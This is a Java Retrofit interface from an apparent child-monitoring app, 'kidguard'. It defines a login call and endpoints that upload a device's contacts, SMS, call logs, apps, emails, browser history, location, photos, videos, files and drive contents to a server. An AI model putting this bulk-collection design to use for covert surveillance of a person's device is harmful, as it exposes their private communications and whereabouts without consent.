package com.kidguard.interfaces;


import com.kidguard.pojo.AppPOJO;
import com.kidguard.pojo.BrowserHistoryPOJO;
import com.kidguard.pojo.CallPOJO;
import com.kidguard.pojo.ContactPOJO;
import com.kidguard.pojo.DrivePOJO;
import com.kidguard.pojo.EmailPOJO;
import com.kidguard.pojo.FilePOJO;
import com.kidguard.pojo.ImagePOJO;
import com.kidguard.pojo.LocationPOJO;
import com.kidguard.pojo.LogInPOJO;
import com.kidguard.pojo.SmsPOJO;
import com.kidguard.pojo.VideoPOJO;

import java.util.HashMap;

import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.Multipart;
import retrofit2.http.POST;
import retrofit2.http.Part;
import retrofit2.http.PartMap;
import retrofit2.http.Query;

@SuppressWarnings("all")
public interface RestClient {

    @FormUrlEncoded
    @POST("./")
    Call<LogInPOJO> logInRequest(@Field("email") String email,
                                 @Field("password") String password,
                                 @Field("device_token") String device_token);

    @FormUrlEncoded
    @POST("./")
    Call<ContactPOJO> sendContactsToServer(@Field("api_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<SmsPOJO> sendSmsToServer(@Field("api_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<CallPOJO> sendCallsToServer(@Field("api_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<AppPOJO> sendAppsToServer(@Field("api_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<EmailPOJO> sendEmailsToServer(@Field("api_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<BrowserHistoryPOJO> sendBrowserHistoryToServer(@Field("api_token") String token, @Field("data") String data);

    @FormUrlEncoded
    @POST("./")
    Call<LocationPOJO> sendLocationToServer(@Field("api_token") String token, @Field("data") String data);

    @Multipart
    @POST("./")
    Call<ImagePOJO> sendImageToServer(@Query("api_token") String token,
                                      @PartMap() HashMap<String, RequestBody> map,
                                      @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<VideoPOJO> sendVideoToServer(@Query("api_token") String token,
                                      @PartMap() HashMap<String, RequestBody> map,
                                      @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<FilePOJO> sendFilesToServer(@Query("api_token") String token,
                                     @PartMap() HashMap<String, RequestBody> map,
                                     @Part MultipartBody.Part file);

    @Multipart
    @POST("./")
    Call<DrivePOJO> sendDriveToServer(@Query("api_token") String token,
                                     @PartMap() HashMap<String, RequestBody> map,
                                     @Part MultipartBody.Part file);

}
